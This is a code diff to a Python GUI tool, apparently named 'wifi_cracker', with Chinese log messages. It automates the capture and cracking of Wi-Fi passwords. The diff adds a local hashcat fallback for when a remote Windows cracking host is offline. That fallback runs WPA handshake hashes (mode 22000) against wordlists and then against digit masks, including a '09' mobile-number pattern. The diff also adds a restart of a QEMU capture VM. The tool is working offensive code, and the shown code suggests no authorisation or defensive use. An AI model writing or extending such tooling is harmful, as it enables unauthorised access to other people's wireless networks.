@@ -554,7 +554,12 @@ class App:
                 self._zero_scans = zero
                 if zero >= 3:
                     self._zero_scans = 0
-                    self._log('連續掃不到訊號 → 重啟抓包環境')
+                    self._log('連續掃不到訊號 → 重建抓包環境')
+                    try:
+                        subprocess.run(['pkill', '-f', 'qemu-system-aarch64'])
+                    except Exception:
+                        pass
+                    time.sleep(2)
                     self._startup_vm()
             else:
                 self._zero_scans = 0
@@ -774,7 +779,16 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
         # ---- 3. post ----
         posted = self._post(self._target_lines(), ssid, bssid, wip, port)
         if not posted:
-            self._log('⚠️ POST 失敗（Windows 沒開？）— 30s 後重試')
+            self.set_phase('crack', 'Windows 離線 → Mac 本機破解',
+                           'hashcat 本機跑（較慢）')
+            self._result('本機破解中…', C_AMBER)
+            result = self._crack_local()
+            if result:
+                self.set_phase('done', '🎉 本機破解成功', result)
+                self._result('🎉  %s' % result, C_GREEN)
+                self._log('🎉🎉 本機密碼: %s  (%s)' % (result, ssid))
+                return
+            self._log('⚠️ 本機破解無結果 — 30s 後重試')
             self._result('等 Windows (%s:%s)' % (wip, port), C_AMBER)
             for _ in range(30):
                 if self._stop.is_set():
@@ -821,6 +835,65 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                         f.write(l + '\n')
         except Exception as e:
             self._log('⚠️ 存本機: %r' % e)
+
+    def _read_pot_pw(self, pot):
+        try:
+            targets = set(l.split('*')[0] for l in self._target_lines())
+            for line in open(pot):
+                if ':' not in line:
+                    continue
+                hpart, pw = line.rsplit(':', 1)
+                if hpart.strip() in targets:
+                    return pw.strip()
+        except Exception:
+            pass
+        return None
+
+    def _crack_local(self):
+        hc = '/opt/homebrew/bin/hashcat'
+        if not os.path.exists(hc):
+            self._log('❌ Mac 沒裝 hashcat')
+            return None
+        hf = '/tmp/mac_crack.22000'
+        try:
+            with open(hf, 'w') as f:
+                f.write('\n'.join(self._target_lines()) + '\n')
+        except Exception:
+            return None
+        pot = os.path.expanduser('~/wifi_cracker/local_pot')
+        wl_dir = os.path.expanduser('~/wifi_cracker/wordlists')
+        pw = self._read_pot_pw(pot)
+        if pw:
+            self._log('   ✅ 本機 potfile 秒回')
+            return pw
+        stages = []
+        try:
+            for w in sorted(os.listdir(wl_dir)):
+                if os.path.getsize(os.path.join(wl_dir, w)) < 60 * 1024 * 1024:
+                    stages.append((os.path.join(wl_dir, w), None))
+        except Exception:
+            pass
+        stages += [(None, '09?d?d?d?d?d?d?d?d'), (None, '?d?d?d?d?d?d?d?d'),
+                   (None, '?d?d?d?d?d?d?d?d?d?d')]
+        for wl, mask in stages:
+            if self._stop.is_set():
+                return None
+            desc = mask or os.path.basename(wl)
+            self._ui(lambda d=desc: self._set_text(
+                self.phases['crack_sub'], 'Mac 本機: %s' % d))
+            self._log('   本機階段: %s' % desc)
+            cmd = [hc, '-m', '22000', '-O', '-w', '3',
+                   '--potfile-path', pot, '--outfile-format', '2', hf]
+            cmd += ['-a', '3', mask] if mask else [wl]
+            try:
+                subprocess.run(cmd, capture_output=True,
+                               timeout=1500 if len(mask or '') > 20 else 600)
+            except subprocess.TimeoutExpired:
+                self._log('   階段逾時，跳過')
+            pw = self._read_pot_pw(pot)
+            if pw:
+                return pw
+        return None
 
     def _post(self, hashes, ssid, bssid, wip, port):
         payload = json.dumps({'hash': '\n'.join(hashes), 'ssid': ssid,
